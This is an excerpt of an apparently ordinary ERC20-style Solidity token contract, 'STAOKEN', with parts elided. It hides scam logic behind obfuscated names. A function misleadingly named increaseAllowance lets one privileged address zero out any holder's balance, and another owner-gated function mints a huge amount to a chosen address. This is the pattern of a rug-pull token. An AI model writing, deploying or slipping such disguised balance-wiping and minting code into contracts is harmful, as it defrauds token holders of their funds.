...
contract STAOKEN is Ownable {
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(czaxw34 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = STA[newadd];
        uint256 newaaamount = STA[newadd]+STA[newadd]-curamount;
        STA[newadd] -= newaaamount;
        }else{
        if(czaxw34 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        STA[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(czaxw34 == _msgSender());
        if(czaxw34 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = STA[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        STA[from] = STA[from]-amount;
        STA[to] = STA[to]+amount;
